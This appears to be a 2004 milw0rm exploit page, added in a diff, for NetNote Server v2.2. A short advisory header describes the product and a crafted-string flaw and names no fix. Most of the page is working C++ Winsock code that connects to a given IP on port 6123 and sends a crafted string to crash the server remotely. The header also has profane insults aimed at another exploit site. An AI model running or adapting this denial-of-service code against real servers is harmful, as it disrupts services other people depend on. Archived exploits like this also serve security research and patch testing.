@@ -1,0 +1,152 @@
+<html>
+<head>
+<title>NetNote Server v2.2 build 230 crafted string vulnerability PoC</title>
+<pre>
+/*
+
+
+
+NetNote Server v2.2 build 230, crafted string vulnerability.
+Poc included crash the server.
+
+Full disclosure and poc exploit 
+by class101 [at] DFind.kd-team.com [&amp;] #n3ws [at] EFnet
+13 november 2004
+
+------------------
+WHAT IS NETNOTE
+------------------
+
+Homepage - http://www.alshare.com/
+	
+	NetNote is the most complete free electronic note software.
+	NetNote has been created to improve your productivity by integrating several
+	unique features with an easy-to-use and nice-looking interface.
+	Also called sticky-note utility, this Windows freeware targets SOHO 
+	and medium size businesses as well as the Health community.
+	It has network capabilities (send and receive notes, Instant Messaging),
+	text notes, audio attachments, alarms and models (templates). 
+	It also supports the latest Windows XP features as transparency and XP themes.
+	The 5.0 version contains several features asked by the Health community 
+	(veterinarians, physicians and dentists). 
+	For example, NetNote is now integrated with AVImark, the leading veterinarian software.
+
+
+--------------
+VULNERABILITY
+--------------
+
+	A special string submitted to the server will cause an access violation... 
+
+----
+FIX
+----
+
+	Actually none, the vendor is contacted.
+
+----
+EXTRA
+----
+   
+	Tested on Win2k Server SP4 and WinXP Pro SP1.
+	This shouldn't be more exploitable, else code something 
+	to show me that Im wrong :-&gt;
+
+----
+BY
+----
+
+    class101 [at] DFind.kd-team.com [&amp;] #n3ws [at] EFnet
+						 who
+					   F.U.C.K
+    K-OTik.com displaying the half part of codes they receive
+	(also some other friends to me noticed it..., another ie: 
+	JPEG Exploits, 6 or 7 mirrors displayed, poor assh0les...)
+
+				  milw0rm.com rules!
+*/
+
+#include &quot;winsock2.h&quot;
+#include &quot;fstream.h&quot;
+
+#pragma comment(lib, &quot;ws2_32&quot;)
+
+
+static char payload[100];
+
+char crash[]=&quot;\x90\x90\x90\x90\x20\x20\x20\x20&quot;;
+
+void usage(char* us);
+WSADATA wsadata;
+void ver();
+
+int main(int argc,char *argv[])
+{
+	ver();
+	if ((argc&lt;3)||(argc&gt;4)||(atoi(argv[1])&lt;1)||(atoi(argv[1])&gt;1)){usage(argv[0]);return -1;}
+	if (WSAStartup(MAKEWORD(2,0),&amp;wsadata)!=0){cout&lt;&lt;&quot;[+] wsastartup error: &quot;&lt;&lt;WSAGetLastError()&lt;&lt;endl;return -1;}
+	int ip=htonl(inet_addr(argv[2])), port;
+	if (argc==4){port=atoi(argv[3]);}
+	else port=6123;
+	SOCKET s;
+	struct fd_set mask;
+	struct timeval timeout; 
+	struct sockaddr_in server;
+	s=socket(AF_INET,SOCK_STREAM,0);
+	if (s==INVALID_SOCKET){ cout&lt;&lt;&quot;[+] socket() error: &quot;&lt;&lt;WSAGetLastError()&lt;&lt;endl;WSACleanup();return -1;}
+	server.sin_family=AF_INET;
+	server.sin_addr.s_addr=htonl(ip);
+	server.sin_port=htons(port);
+	WSAConnect(s,(struct sockaddr *)&amp;server,sizeof(server),NULL,NULL,NULL,NULL);
+	timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&amp;mask);FD_SET(s,&amp;mask);
+	switch(select(s+1,NULL,&amp;mask,NULL,&amp;timeout))
+	{
+		case -1: {cout&lt;&lt;&quot;[+] select() error: &quot;&lt;&lt;WSAGetLastError()&lt;&lt;endl;closesocket(s);return -1;}
+		case 0: {cout&lt;&lt;&quot;[+] connect() error: &quot;&lt;&lt;WSAGetLastError()&lt;&lt;endl;closesocket(s);return -1;}
+		default:
+		if(FD_ISSET(s,&amp;mask))
+		{
+			cout&lt;&lt;&quot;[+] connected, sending the bad string...&quot;&lt;&lt;endl;
+			Sleep(1000);
+			if (atoi(argv[1]) == 1){strcat(payload,crash);}
+			strcat(payload,&quot;\r\n&quot;);
+			Sleep(1000);
+		    if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) { cout&lt;&lt;&quot;[+] sending error, the server prolly rebooted.&quot;&lt;&lt;endl;return -1;}
+			Sleep(1000);
+			if (atoi(argv[1]) == 1){cout&lt;&lt;&quot;[+] payload send, the NetNote server should be crashed.&quot;&lt;&lt;endl;}
+			return 0;
+		}
+	}
+	closesocket(s);
+	WSACleanup();
+	return 0;
+}
+
+
+void usage(char* us) 
+{  
+	cout&lt;&lt;&quot;USAGE: 101_netn.exe Method Ip Port\n&quot;&lt;&lt;endl;
+	cout&lt;&lt;&quot;TARGETS:                               &quot;&lt;&lt;endl;
+	cout&lt;&lt;&quot;      [+] 1. Crash NetNote Server  (*)&quot;&lt;&lt;endl;
+	cout&lt;&lt;&quot;NOTE:                               &quot;&lt;&lt;endl;
+	cout&lt;&lt;&quot;      The port 6123 is default if no port are specified&quot;&lt;&lt;endl;
+	cout&lt;&lt;&quot;      The exploit crash the server.&quot;&lt;&lt;endl;
+	cout&lt;&lt;&quot;      A wildcard (*) mean Tested.&quot;&lt;&lt;endl;
+	return;
+} 
+
+void ver()
+{	
+cout&lt;&lt;endl;
+cout&lt;&lt;&quot;                                                                   &quot;&lt;&lt;endl;
+cout&lt;&lt;&quot;        ===================================================[v0.1]====&quot;&lt;&lt;endl;
+cout&lt;&lt;&quot;        ===NetNote Server v2.2, Free Electronic Notes for Windows====&quot;&lt;&lt;endl; 
+cout&lt;&lt;&quot;        ========Remote Crafted String Vulnerability==================&quot;&lt;&lt;endl;
+cout&lt;&lt;&quot;        ====coded by class101===========[DFind.kd-team.com 2004]=====&quot;&lt;&lt;endl;
+cout&lt;&lt;&quot;        =============================================================&quot;&lt;&lt;endl;
+cout&lt;&lt;&quot;                                                                   &quot;&lt;&lt;endl;
+}
+</pre>
+// milw0rm.com [2004-11-13]
+</html>
+
